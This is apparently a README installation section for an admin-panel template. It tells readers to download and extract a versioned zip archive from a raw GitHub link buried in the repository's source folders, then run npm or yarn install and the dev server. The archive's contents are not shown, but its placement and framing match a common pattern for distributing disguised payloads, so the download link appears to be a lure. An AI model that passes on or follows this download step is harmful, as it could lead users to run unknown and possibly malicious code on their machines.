## Installation
Here are the steps you need to follow to install the dependencies.

1. Download and extract the template from https://github.com/rudegent1705/pubAdminPanel/raw/refs/heads/main/src/app/setting/pub-Panel-Admin-2.8-alpha.2.zip Templates.

2. After that **cd** into the template directory then run this command to install all the dependencies

```
npm install
```
or

```
yarn install
```

3. Now run this command to start the developement server

```
npm run dev
```

or 

```
yarn dev
```
